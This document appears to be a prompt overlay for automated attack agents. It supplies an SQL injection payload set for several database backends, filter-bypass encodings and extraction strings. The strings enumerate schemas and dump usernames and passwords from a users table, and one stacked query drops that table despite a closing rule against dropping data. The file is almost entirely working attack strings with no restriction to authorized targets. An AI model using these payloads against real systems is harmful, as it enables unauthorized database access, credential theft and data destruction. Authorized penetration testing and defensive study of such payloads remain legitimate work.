# SQLi — Dynamic Overlay

## Metadata
- **Exploit Type**: sqli
- **Applies To**: Gamma, MCP Agent
- **Loading**: Appended when `exploit_type === "sqli"`

---

## OVERLAY_CONTEXT

SQL injection exploits unsanitized user input in SQL queries. Success indicators: SQL error in response, time delay (SLEEP/BENCHMARK), or data extraction via UNION. Different database backends require different payloads.

---

## Payloads

### Boolean-Based Blind (Baseline)
```
' AND 1=1--
' AND 1=2--
admin' AND '1'='1
admin' AND '1'='2
```

### Time-Based Blind (Baseline)
```
' OR SLEEP(5)--
' OR BENCHMARK(5000000,MD5('a'))--
' OR pg_sleep(5)--
admin' OR SLEEP(5)--
```

### Union-Based (Baseline)
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

### Error-Based (Aggressive)
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
' AND UPDATEXML(1,CONCAT(0x7e,database()),1)--
```

### Stacked Queries (Aggressive — if multi-query enabled)
```
'; DROP TABLE users--
'; SELECT * FROM users WHERE '1'='1
```

### Second-Order SQLi (Evasive)
```
admin'--
```
(First injects, second request triggers)

---

## Database-Specific Payloads

### MySQL
```
' OR SLEEP(5)--
' UNION SELECT NULL--
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))
```

### PostgreSQL
```
'; SELECT pg_sleep(5)--
' UNION SELECT NULL--
' AND (SELECT 1 FROM pg_sleep(5))--
```

### SQLite
```
' OR 1=1--
' UNION SELECT NULL--
```

### Oracle
```
' OR 1=1--
' UNION SELECT NULL FROM DUAL--
' AND CTXSYS.DRITHSX.SN(user,(1))--
```

---

## Bypasses

### Whitespace Substitution
```
admin'\tOR\t'1'='1
admin'/**/OR/**/'1'='1
admin'%0aOR%0a'1'='1
admin'%09OR%09'1'='1
```

### Comment Injection
```
admin'--comment
admin'/*comment*/OR/**/'1'='1
```

### URL Encoding
```
%27%20OR%201%3D1
%27%20UNION%20SELECT%20NULL--
```

### Case Variation
```
AdMiN' Or '1'='1
AdMiN' UnIoN SeLeCt NuLL--
```

### Hex Encoding
```
' OR 1=1--  (encode special chars as %hex)
```

---

## Data Extraction Payloads

### Enumerate Database Version
```
' UNION SELECT @@version--
' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--
```

### List Databases
```
' UNION SELECT schema_name FROM information_schema.schemata--
' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--
```

### List Tables
```
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database'--
```

### List Columns
```
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

### Dump Users Table
```
' UNION SELECT NULL,NULL,username,password,NULL,NULL FROM users--
```

---

## Constraints

```
- ALWAYS set appropriate timeout for time-based payloads (SLEEP(5) → timeout 10s minimum)
- For UNION-based: determine column count first with ORDER BY
- On PostgreSQL/MySQL: information_schema is usually available
- On SQL Server: use ORDER BY or try ' having 1=1-- for error extraction
- NEVER DELETE or DROP data — read-only extraction only
```

---

*Overlay version: 1.0*
